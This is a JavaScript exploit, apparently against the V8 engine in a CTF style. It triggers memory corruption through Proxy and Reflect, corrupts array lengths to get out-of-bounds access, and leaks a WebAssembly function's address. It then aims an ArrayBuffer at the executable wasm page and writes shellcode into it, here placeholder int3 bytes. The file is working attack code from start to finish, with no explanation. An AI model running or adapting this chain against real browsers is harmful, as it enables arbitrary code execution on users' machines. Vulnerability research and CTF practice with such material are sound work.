callFn = function (code) {
    try { code(); } catch (e) { console.log(e); }
}


let proxy = new Proxy({}, {});


function run(prop, ...args) {
    let handler = {};
    const proxy = new Proxy(function () {}, handler);
    handler[prop] = (({v1 = ((v2 = (function () {
        var v3 = 0;
        var callFn = 0;
        if (asdf) { return; } else { return; }
        (function () { v3(); });
        (function () {
            callFn = "\u0041".repeat(1024*32);
            v3 = [1,2,3,4,5,6];
        })
    })) => (1))() }, ...args) => (1));
    Reflect[prop](proxy, ...args);
}


callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));


function pwn() {
    // Corrupt SMI Packed Array's Length
    run[13] = 0x41414141;


    var f64 = new Float64Array(1);
    var u32 = new Uint32Array(f64.buffer);


    function d2u(v) {
        f64[0] = v;
        return u32;
    }


    function u2d(lo, hi) {
        u32[0] = lo;
        u32[1] = hi;
        return f64[0];
    }


    function hex(lo, hi) {
        if( lo == 0 ) {
            return ("0x" + hi.toString(16) + "-00000000");
        }
        if( hi == 0 ) {
            return ("0x" + lo.toString(16));
        }
        return ("0x" + hi.toString(16) + "-" + lo.toString(16));
    }


    let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
    let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
    let f = wasm_mod.exports._Z3addii;


    proxy[0] = 0x12121212;
    let oob = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let boxed_obj = [f, f, f, f, 0x10, 0x11, 0x12, 0x13];
    let ab = new ArrayBuffer(0x3636);


    // Corrupt Unboxed Double Array Length :)
    proxy[17] = 0x4000;
    if (oob.length != 0x4000) {
        console.log("Exploit Fail :(");
        return false;
    }


/*
    // for dump :)
    for (let i = 0; i < 100; i++) {
        tmp = d2u(oob[i]);
        console.log("index " + i + " : " + hex(tmp[0], tmp[1]));
    }
*/


    // index 24 -> Wasm Function
    let wasm_addr = d2u(oob[24]);


    // index 35 -> ArrayBuffer
    // index 36 -> backing_store
    oob[36] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
    let dv = new DataView(ab);


    lo = dv.getUint32(0x18, true);
    hi = dv.getUint32(0x18 + 4, true);


    oob[36] = u2d(lo - 1 - 0xc0, hi);
    rwx_lo = dv.getUint32(0, true);
    rwx_hi = dv.getUint32(4, true);


    oob[36] = u2d(rwx_lo, rwx_hi);

    // Set shellcode here :)
    for (let i = 0; i < 20; i++) {
        dv.setUint32(4 * i, 0xcccccccc, true);
    }


    f();
    return true;
}


pwn();
